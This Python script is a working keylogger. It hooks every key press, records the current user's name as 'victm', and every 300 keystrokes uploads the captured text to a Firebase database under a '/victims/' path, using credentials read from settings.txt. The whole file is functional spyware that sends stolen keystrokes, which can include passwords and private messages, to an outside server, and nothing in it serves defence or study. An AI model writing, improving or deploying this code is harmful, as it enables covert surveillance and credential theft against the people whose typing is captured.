import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
import re
from datetime import datetime
import keyboard
import getpass
victm = getpass.getuser()
keylogs = "[START LOG] "
count = 0
start = True
with open('settings.txt', 'r') as file:
        lines = file.readlines()
        for i in range(0, len(lines), 2):
            if i + 1 < len(lines):
                credspath = re.search(r'credspath="(.*?)"', lines[i])
                urlpath = re.search(r'firebaseappurlpath="(.*?)"', lines[i + 1])
                if credspath and urlpath:
                    credsfinal = credspath.group(1)
                    urlfinal = urlpath.group(1)
cred = credentials.Certificate(credsfinal)
firebase_admin.initialize_app(cred, {
    'databaseURL': str(urlfinal)
})
ref = db.reference('/victims/'+victm)
keylogs = "[START LOG] "
def on_key_event(event):
    global keylogs
    global count
    if event.event_type == keyboard.KEY_DOWN:
        count+=1
        key_name = event.name
        if key_name != "space" :
            keylogs += key_name
        else:
            keylogs += " "
        print("Current text:", keylogs)
        data = {
            'logs at ' +  str(datetime.now().strftime("%H:%M:%S")) : str(keylogs) + " [END LOG]",
        }
        if count >= 300:
            ref.update(data)
            print("Data written successfully.") 
            count = 0
            keylogs = "[START LOG] "
keyboard.on_press(on_key_event)
keyboard.wait('esc')              
